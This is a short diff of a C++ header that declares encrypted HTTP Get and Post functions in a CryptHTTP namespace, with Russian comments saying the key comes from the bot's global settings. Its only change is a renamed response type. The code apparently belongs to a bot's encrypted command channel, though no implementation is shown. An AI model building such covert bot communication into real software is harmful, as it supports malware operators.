@@ -25,11 +25,11 @@
 namespace CryptHTTP
 {
 	// Загрузить шифрованный документ
-	bool Get(PCHAR URL, PCHAR Password, PCHAR *Buf, PHTTPResponse Response, bool MultiLineBuffer = false);
+	bool Get(PCHAR URL, PCHAR Password, PCHAR *Buf, PHTTPResponseRec Response, bool MultiLineBuffer = false);
 
 	// Функция отправляет зашифрованные пост данные на указанный
 	// адрес. ключ берётся из глобальных настроек бота
-	bool Post(PCHAR URL, PCHAR Password, PStrings Fields, PCHAR *Buf, PHTTPResponse Response, bool MultiLineBuffer = false);
+	bool Post(PCHAR URL, PCHAR Password, PStrings Fields, PCHAR *Buf, PHTTPResponseRec Response, bool MultiLineBuffer = false);
 }
 
 //---------------------------------------------------------------------------
